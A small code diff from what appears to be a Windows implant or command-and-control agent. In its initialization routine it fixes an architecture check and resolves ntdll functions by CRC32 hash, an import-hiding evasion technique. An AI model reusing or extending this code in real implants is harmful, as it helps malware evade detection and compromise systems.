@@ -1,4 +1,4 @@
-#include "Asm.h"
+
 #include "Core.h"
 #include "Config.h"
 #include "Package.h"
@@ -22,12 +22,12 @@ VOID RvntInit() {
     Instance.Config.Transport.Secure    = CONFIG_SECURE;
 
     // Init Win32
-#if CONFIG_ARCH == x64
+#if CONFIG_ARCH == 64
     void *ntdll_base = get_ntdll_64();
 #else
     void *ntdll_base = get_ntdll_32();
 #endif
-
+    // _tprintf("NTDLL_BASE: %x\n", ntdll_base);
     Instance.Win32.RtlRandomEx   = get_proc_address_by_hash(ntdll_base, RtlRandomEx_CRC32B);
     Instance.Win32.RtlGetVersion = get_proc_address_by_hash(ntdll_base, RtlGetVersion_CRC32B);
 
